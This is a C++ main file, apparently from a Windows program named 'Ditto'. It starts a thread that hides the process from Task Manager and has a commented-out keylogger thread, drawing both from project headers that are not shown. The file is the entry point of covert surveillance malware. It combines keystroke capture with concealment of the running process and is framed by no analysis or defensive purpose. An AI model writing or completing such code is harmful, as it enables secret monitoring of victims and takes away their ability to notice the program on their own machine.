#include "pch.h"
#include "Process.hpp"
#include "WindowsException.hpp"
#include "Logger.hpp"
#include "SystemUtils.hpp"
#include "KeyLogger.hpp"
#include <exception>
#include <iostream>
#include <chrono>

int main()
{
	try 
	{
		Logger::Instance().info(L"<<<<<<<<<<<<<<<<< DITTO IS RUNNING >>>>>>>>>>>>>>>>>>>");

		//Thread key_logger_thread{ reinterpret_cast<LPTHREAD_START_ROUTINE>(&KeyLogger::start), nullptr };
		Thread tskmgr_thread{ reinterpret_cast<LPTHREAD_START_ROUTINE>(&SystemUtils::hide_from_task_manager), nullptr };
		
		//key_logger_thread.run();
		tskmgr_thread.run();
		tskmgr_thread.wait();

	}
	catch (WindowsException exp)
	{
		std::wcout << exp.what() << std::endl;
	}
	catch (std::exception exp)
	{
		std::wcout << exp.what() << std::endl;
	}
	catch (...)
	{
		OutputDebugString(L"Unexpected exception");
	}
}